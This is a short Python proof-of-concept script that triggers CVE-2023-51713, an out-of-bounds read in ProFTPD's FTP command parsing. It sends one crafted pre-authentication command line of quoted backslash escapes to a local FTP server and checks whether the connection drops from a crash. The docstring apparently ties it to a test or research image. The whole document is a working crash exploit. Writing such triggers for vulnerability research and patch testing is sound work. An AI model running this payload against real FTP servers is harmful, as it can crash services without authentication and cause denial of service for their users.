#!/usr/bin/env python3
"""CVE-2023-51713 (ProFTPD make_ftp_cmd OOB read) trigger — adapted for campaign image.

Usage: pftp_trigger.py <n_escapes>
Sends:  b'"' + b'\\A'*n + b'"' + b' X\r\n'  (single FTP command line, pre-auth)
"""
import socket, sys, time

n = int(sys.argv[1]) if len(sys.argv) > 1 else 252
payload = b'"' + b'\\A' * n + b'"' + b' X\r\n'
print(f"[*] payload bytes: {len(payload)} (escapes={n})")

s = socket.create_connection(("127.0.0.1", 21), timeout=10)
banner = s.recv(4096)
print(f"[*] banner: {banner[:60]!r}")
s.sendall(payload)
try:
    resp = s.recv(4096)
    print(f"[*] response: {resp[:120]!r}")
except Exception as e:
    print(f"[!] recv error (connection likely reset by crash): {e}")
s.close()
